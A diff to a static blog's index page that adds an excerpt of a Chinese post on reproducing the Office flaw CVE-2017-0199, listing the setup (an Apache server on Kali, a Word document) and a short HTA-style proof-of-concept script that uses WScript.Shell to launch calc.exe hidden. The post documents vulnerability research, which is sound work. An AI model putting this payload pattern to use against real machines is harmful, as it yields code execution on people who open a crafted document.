@@ -148,6 +148,77 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-CVE-2017-0199漏洞复现过程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/04/18/CVE-2017-0199漏洞复现过程/">CVE-2017-0199漏洞复现过程</a>
+    </h1>
+  
+
+        
+        <a href="/2017/04/18/CVE-2017-0199漏洞复现过程/" class="archive-article-date">
+  	<time datetime="2017-04-18T02:43:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-18</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>记录一下过程，周日已经出了结果，但是过程忘记了，抽空再次实现了一下。</p>
+</blockquote>
+<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>一台apache服务器（这里我用Kali）、POC和一个Word文档。<br>POC内容大概如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">a=new ActiveXObject(<span class="string">"WScript.Shell"</span>);</div><div class="line">a.run(<span class="string">'%windir%\\System32\\cmd.exe /c calc.exe'</span>, 0);window.close();</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+        
+          <a class="article-more-a" href="/2017/04/18/CVE-2017-0199漏洞复现过程/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CVE-2017-0199</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">office漏洞</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/04/18/CVE-2017-0199漏洞复现过程/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-方程式漏洞利用之SMB" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -642,6 +713,14 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">SMB漏洞</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">CVE-2017-0199</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">office漏洞</a>
               </li>
             
             <div class="clearfix"></div>
